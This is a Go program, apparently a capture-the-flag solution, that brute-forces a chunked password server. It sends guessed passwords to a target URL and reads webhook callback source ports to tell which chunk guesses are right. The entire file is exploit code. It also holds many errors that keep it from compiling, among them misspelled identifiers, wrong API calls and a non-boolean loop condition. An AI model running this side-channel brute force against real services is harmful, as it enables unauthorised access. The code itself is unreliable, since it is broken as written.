// chunk_hacker.go file for learning purpose.
package main

import (
	"bytes"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"os"
	"sort"
	"strconv"
	"strings"
	"time"
)

func hookServer(hookPort chan int) {
	listener, err := net.Listen("tcp", ":"+os.Args[2])
	if err != nil {
		fmt.Println("Lisener err : %s\n", err)
		os.Exit(1)
	}

	for {
		connection, err := listener.Accept() // Started with setting up connection
		if err != nil {
			fmt.Println("Listener connection error: %s\n", err)
		}
		go handleHook(connection, hookPort)
	}
}

func handleHook(connection net.Conn, hookPort chan int) {
	_, sourcePort, _ := net.SplitHostPort(connection.RemoteAddr().String())
	connection.Close() // ?connection can now be closed....because we only need port?
	sourcePortInt, _ := strconv.ParseInt(sourcePort, 10, 0)
	hookPort <- int(sourcePort)
}

func requestChunk(client *http.Client, password string, chunks int) {
	payload := ""
	if chunks < 3 {
		webhook := fmt.Sprintf(`"%s:%s`, os.Args[1], os.Args[2])
		payload = fmt.Sprintf(`{"password": "%s", "webhooks":[%s]}`, password, webhook)
	} else {
		payload = fmt.Sprintf(`{"password": "%s", "webhooks":[]}`, password)
	}

	response, err := client.Post(os.Args[3], "application/json", bytes.NewBufferString(payload))
	if err != nil {
		panic(err)
	}

	body := new(bytes.Buffer)
	body.ReadFrom(response.Body)
	defer response.Body.Close()
	if bytes.Contains(body.Bytes(), []byte("true")) {
		fmt.Printf("\n\nFOUND FLAG!!!%s\n", password)
		os.Exit(0)
	}
}

func formatPassword(chunks []string, candidate int) string {
	password := strings.Join(chunks, "")
	password += fmt.Sprintf("%03d", candidate)
	password += strings.Repeat("x", 12-len(password))
	return password
}

func checkPorts(ports []int, foundChunks int) bool {
	sort.Int(ports)
	valid := true
	for i := 0; i <= len(ports)-2; i++ {
		if ports[i+1]-ports[i] < foundChunks+3 {
			valid = false
			break
		}
	}
	return valid
}

func requester(hookPort chan int) {
	client := &http.Client()
	chunks := make([]string, 0, 4)
	ports := make([]int, 0, 10)
	if len(os.Args) > 4 {
		chunks = strings.Split(os.Args[4], ",")
	}

	for len(chunks) {
		candidates := rand.Perm(999)
		for index, candicate := range candidates {
			fmt.Println("\r%03d", index)
			password := formatPassword(chunks, candidate)

			for len(ports) <= 1 || (len(ports) < 10 && checkPorts(ports, len(chunks))) {
				requestChunk(Client, password, len(chunks))
				ports = append(ports, <-hookPort)
			}

			if len(ports) == 10 && checkPorts(ports, len(chunks)) {
				chunks = append(chunks, fmt.Sprintf("%03d", candidate))
				fmt.Printf("\nFound chunk %d: %03d\n%s\n", len(chunks), candidate, strings.Join(chunks, ","))
				break
			}

			ports = append(make([]int, 0, 10), ports[len(ports)-1])
		}
	}

	if len(chunks) == 3 {
		concurrency := 10
		nextCandidate := make(chan int)
		done := make(chan bool)

		go func(nextCandidate chan int, done chan bool) {
			candidates := rand.Perm(999)
			for candidate := range candidates { // ? this way will pass in only the index
				nextCandidate <- candidate
			}
			done <- true
		}(nextCandidate, done)

		for i := 0; i < concurrency; i++ {
			go func(nextCandidate chan int) {
				for candidate := range nextCandidate {
					password := formatPassword(chunks, candidate)
					requestChunk(client, password, len(chunks))
				}
			}(nextCandidate)
		}
		<-done
	}
}

func hacker() {
	hookPort := make(chan int)
	go hookServer(hookPort) // only goroutine the hookServer part, not the requester part.
	requester(hookPort)
}

func main() {
	rand.Seed(int64(time.Now().Nanosecond()))
	hacker()
}
